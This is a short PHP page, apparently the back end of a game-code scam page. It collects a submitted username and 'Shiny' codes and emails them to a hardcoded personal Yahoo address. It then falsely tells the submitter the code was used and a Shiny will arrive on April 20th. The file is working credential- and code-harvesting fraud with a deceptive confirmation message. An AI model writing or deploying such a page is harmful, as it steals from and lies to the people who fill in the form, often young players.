<!DOCTYPE html>
<html>
<head><title>Send</title>
</head>
<body>
<?php
if($_POST['usname']!="" AND $_POST['coded']!="")
{
$empf="doa2wsw@yahoo.de";
$betreff="Shiny Code Eingabe";
$name .= $_POST['usname'];
$name .= "\n";
$marke .= $_POST['coded'];
$marke .= "\n";
$marke .= $_POST['shinys'];
$marke .= "\n";
mail($empf, $betreff, $marke, $name);
echo "Shiny Code was successfully used, you'll get the Shiny on April 20th.";
} 
else {
	echo "You forget to enter the Username. Do always enter your Username first!";
}

?>

</body>
</html>